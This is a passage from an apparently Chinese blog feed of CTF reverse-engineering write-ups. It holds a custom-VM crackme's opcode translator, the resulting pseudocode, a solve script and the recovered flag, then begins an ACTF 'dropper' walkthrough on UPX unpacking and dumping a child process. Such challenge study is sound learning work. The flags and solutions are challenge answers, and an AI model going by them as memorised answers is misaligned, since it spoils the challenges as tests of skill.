class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF4</span>]<br>r1 = <span class="hljs-number">0</span><br>r2 = <span class="hljs-number">0x12</span><br>r3 = <span class="hljs-number">0</span><br>r4 = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(opcode)):<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">0xF1</span>:<br>        <span class="hljs-keyword">if</span> opcode[i + <span class="hljs-number">1</span>] == <span class="hljs-number">0xE1</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;r1 = input[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>]&quot;</span>)<br>        <span class="hljs-keyword">elif</span> opcode[i + <span class="hljs-number">1</span>] == <span class="hljs-number">0xE2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;r2 = input[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>]&quot;</span>)<br>        <span class="hljs-keyword">elif</span> opcode[i + <span class="hljs-number">1</span>] == <span class="hljs-number">0xE3</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;r3 = input[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>]&quot;</span>)<br>        <span class="hljs-keyword">elif</span> opcode[i + <span class="hljs-number">1</span>] == <span class="hljs-number">0xE4</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;input[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>] = r1&quot;</span>)<br>        <span class="hljs-keyword">elif</span> opcode[i + <span class="hljs-number">1</span>] == <span class="hljs-number">0xE5</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;r4 = input[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>]&quot;</span>)<br>        <span class="hljs-keyword">elif</span> opcode[i + <span class="hljs-number">1</span>] == <span class="hljs-number">0xE7</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;input[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>] = r2&quot;</span>)<br>    <span class="hljs-keyword">elif</span> opcode[i] == <span class="hljs-number">0xF2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r1 ^= r2&quot;</span>)<br>    <span class="hljs-keyword">elif</span> opcode[i] == <span class="hljs-number">0xF5</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;scanf&quot;</span>)<br>    <span class="hljs-keyword">elif</span> opcode[i] == <span class="hljs-number">0xF4</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nop&quot;</span>)<br>    <span class="hljs-keyword">elif</span> opcode[i] == <span class="hljs-number">0xF7</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r1 *= r4&quot;</span>)<br>    <span class="hljs-keyword">elif</span> opcode[i] == <span class="hljs-number">0xF8</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;swap( r1, r2 ) &quot;</span>)<br>    <span class="hljs-keyword">elif</span> opcode[i] == <span class="hljs-number">0xF6</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r1 = r3 + r2 * 2 + 3 * r1&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>翻译完成后我们可以得到这样的伪代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs python">scanf<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">0</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">32</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">1</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">33</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">2</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">34</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">3</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">35</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">4</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">36</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">5</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">37</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">6</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">38</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">7</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">39</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">8</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">40</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">9</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">41</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">10</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">42</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">11</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">43</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">12</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">44</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">13</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">45</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">14</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">46</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">15</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">47</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">16</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">48</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">17</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">49</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">18</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">50</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">19</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">51</span>] = r1<br>nop<br><br><br>scanf<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">0</span>]<br>r2 = <span class="hljs-built_in">input</span>[<span class="hljs-number">1</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">0</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">1</span>]<br>r2 = <span class="hljs-built_in">input</span>[<span class="hljs-number">2</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">1</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">2</span>]<br>r2 = <span class="hljs-built_in">input</span>[<span class="hljs-number">3</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">2</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">3</span>]<br>r2 = <span class="hljs-built_in">input</span>[<span class="hljs-number">4</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">3</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">4</span>]<br>r2 = <span class="hljs-built_in">input</span>[<span class="hljs-number">5</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">4</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">5</span>]<br>r2 = <span class="hljs-built_in">input</span>[<span class="hljs-number">6</span>]<br>r1 ^= r2<br><span class="hljs-built_in">input</span>[<span class="hljs-number">5</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">6</span>]<br>r2 = <span class="hljs-built_in">input</span>[<span class="hljs-number">7</span>]<br>r3 = <span class="hljs-built_in">input</span>[<span class="hljs-number">8</span>]<br>r4 = <span class="hljs-built_in">input</span>[<span class="hljs-number">12</span>]<br>r1 = r3 + r2 * <span class="hljs-number">2</span> + <span class="hljs-number">3</span> * r1<br>r1 *= r4<br><span class="hljs-built_in">input</span>[<span class="hljs-number">6</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">7</span>]<br>r2 = <span class="hljs-built_in">input</span>[<span class="hljs-number">8</span>]<br>r3 = <span class="hljs-built_in">input</span>[<span class="hljs-number">9</span>]<br>r4 = <span class="hljs-built_in">input</span>[<span class="hljs-number">12</span>]<br>r1 = r3 + r2 * <span class="hljs-number">2</span> + <span class="hljs-number">3</span> * r1<br>r1 *= r4<br><span class="hljs-built_in">input</span>[<span class="hljs-number">7</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">8</span>]<br>r2 = <span class="hljs-built_in">input</span>[<span class="hljs-number">9</span>]<br>r3 = <span class="hljs-built_in">input</span>[<span class="hljs-number">10</span>]<br>r4 = <span class="hljs-built_in">input</span>[<span class="hljs-number">12</span>]<br>r1 = r3 + r2 * <span class="hljs-number">2</span> + <span class="hljs-number">3</span> * r1<br>r1 *= r4<br><span class="hljs-built_in">input</span>[<span class="hljs-number">8</span>] = r1<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">13</span>]<br>r2 = <span class="hljs-built_in">input</span>[<span class="hljs-number">19</span>]<br>swap( r1, r2 )<br><span class="hljs-built_in">input</span>[<span class="hljs-number">13</span>] = r1<br><span class="hljs-built_in">input</span>[<span class="hljs-number">19</span>] = r2<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">14</span>]<br>r2 = <span class="hljs-built_in">input</span>[<span class="hljs-number">18</span>]<br>swap( r1, r2 )<br><span class="hljs-built_in">input</span>[<span class="hljs-number">14</span>] = r1<br><span class="hljs-built_in">input</span>[<span class="hljs-number">18</span>] = r2<br>r1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">15</span>]<br>r2 = <span class="hljs-built_in">input</span>[<span class="hljs-number">17</span>]<br>swap( r1, r2 )<br><span class="hljs-built_in">input</span>[<span class="hljs-number">15</span>] = r1<br><span class="hljs-built_in">input</span>[<span class="hljs-number">17</span>] = r2<br>nop<br></code></pre></td></tr></table></figure><p>此时我们就可以对其进行求解，得到真正的输入部分，解题脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">check = [<span class="hljs-number">0x69</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x72</span>,<br>  <span class="hljs-number">0x33</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x72</span>]<br><br>check[<span class="hljs-number">13</span>], check[<span class="hljs-number">19</span>] = check[<span class="hljs-number">19</span>], check[<span class="hljs-number">13</span>]<br>check[<span class="hljs-number">14</span>], check[<span class="hljs-number">18</span>] = check[<span class="hljs-number">18</span>], check[<span class="hljs-number">14</span>]<br>check[<span class="hljs-number">15</span>], check[<span class="hljs-number">17</span>] = check[<span class="hljs-number">17</span>], check[<span class="hljs-number">15</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>    <span class="hljs-keyword">if</span> check[<span class="hljs-number">8</span>] == ((i*<span class="hljs-number">3</span> + check[<span class="hljs-number">9</span>]*<span class="hljs-number">2</span> + check[<span class="hljs-number">10</span>])*check[<span class="hljs-number">12</span>])&amp;<span class="hljs-number">0xff</span>:<br>        check[<span class="hljs-number">8</span>] = i<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>            <span class="hljs-keyword">if</span> check[<span class="hljs-number">7</span>] == ((j * <span class="hljs-number">3</span> + check[<span class="hljs-number">8</span>] * <span class="hljs-number">2</span> + check[<span class="hljs-number">9</span>]) * check[<span class="hljs-number">12</span>]) &amp; <span class="hljs-number">0xff</span>:<br>                check[<span class="hljs-number">7</span>] = j<br>                <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>                    <span class="hljs-keyword">if</span> check[<span class="hljs-number">6</span>] == ((k * <span class="hljs-number">3</span> + check[<span class="hljs-number">7</span>] * <span class="hljs-number">2</span> + check[<span class="hljs-number">8</span>]) * check[<span class="hljs-number">12</span>]) &amp; <span class="hljs-number">0xff</span>:<br>                        check[<span class="hljs-number">6</span>] = k<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>)[::-<span class="hljs-number">1</span>]:<br>    check[i] ^= check[i+<span class="hljs-number">1</span>]<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(check)):<br>    flag += <span class="hljs-built_in">chr</span>(check[i])<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>得到 flag：<code>flag&#123;Y0u_hav3_r3v3rs3_1t!&#125;</code></p><h2 id="后记">后记</h2><p>至此一个简单的<code>VM</code>就结束了，对于后续的复杂<code>VM</code>题目也是类似的过程，将程序的<code>opcode</code>提取，翻译，解密。更多的还是花费时间进行调试与解密，希望这篇文章能对后者学习的同学有帮助吧</p>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACTF dropper 复现</title>
    <link href="/2022/07/03/ACTF%20dropper%20%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/07/03/ACTF%20dropper%20%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>拿到程序拖入PE中可以发现是一个<code>UPX</code>壳的 64 位程序，我们如果直接<code>upx -d</code>进行脱壳可以发现程序无法运行，因此我们运行<code>x64dbg</code>开始尝试手动脱壳。</p><p><img src="https://s2.loli.net/2022/07/02/ZnrpyagzcRCfSj2.png" alt="1.png"></p><p>脱壳完后的程序在修复一下<code>IAT</code>，之后拖入<code>IDA</code>中,依次进入</p><p><img src="https://s2.loli.net/2022/07/02/oACQvxeyIagtkml.png" alt="2.png"></p><p><img src="https://s2.loli.net/2022/07/02/EkOSMUcPdtZ6u3g.png" alt="3.png"></p><p><img src="https://s2.loli.net/2022/07/02/nAOIXi4FhG9VTc1.png" alt="4.png"></p><p>可以看出来程序创建了一个线程，在运行些什么东西，我们运行原来的程序，打开任务管理器进行查看</p><p><img src="https://s2.loli.net/2022/07/02/17AcWfUKqoP4bSv.png" alt="5.png"></p><p>可以看到多出来一个进程，而且在跑一个可执行的程序，我们对此需要想办法将其<code>dump</code>出来，分析这个子进程的功能，我们再次回到<code>x64dbg</code>中，进行单步调试,在调试过程中我们可以在内存中看到对应的<code>PE</code>文件结构</p><p><img src="https://s2.loli.net/2022/07/02/e8WvlLhcR29qs1Q.png" alt="6.png"></p><p>我们将其<code>dump</code>出来保存为<code>exe</code>，即可得到子进程创建的程序，我们将其拖入<code>IDA</code>进行分析</p><p><img src="https://s2.loli.net/2022/07/03/OHUcLDF2GvI368B.png" alt="7.png"></p><p>在前半截我们动调可以发现程序将内存中的数据进行取反，之后得到<code>flag：</code>这个也就是为什么我们无法直接从内存中进行读取，同时我们可以明显的看到<code>cin</code>和<code>cout</code>，得知这个是一个<code>C++</code>逆向，对于<code>C++</code>逆向在编译中最喜欢套娃和产生一些莫名的函数，对此我们不需要完全分析出每一项函数的作用，只需要推出大致逻辑即可。</p><p><img src="https://s2.loli.net/2022/07/03/kqRYXGHsjL8Fnto.png" alt="8.png"></p><p>在程序下方有一个除 0 异常，在这个异常中我们可以观察到其对虚函数表进行了修改</p><p><img src="https://s2.loli.net/2022/07/03/VWpBTAo5RLxvsQu.png" alt="9.png"></p><p>原来对应虚函数表的操作：</p><p><img src="https://s2.loli.net/2022/07/03/6JwAxzC89Gvgqsy.png" alt="10.png"></p><p>在异常中：</p><p><img src="https://s2.loli.net/2022/07/03/1UtsbLDIBOCj4a3.png" alt="11.png"></p><p>执行触发异常后我们继续<code>F8</code>进行运行，切换至汇编界面，可以发现程序的执行流程被异常改变了，将原先的虚函数表进行了替换操作</p><p><img src="https://s2.loli.net/2022/07/03/CPY9LjANl1d5pZv.png" 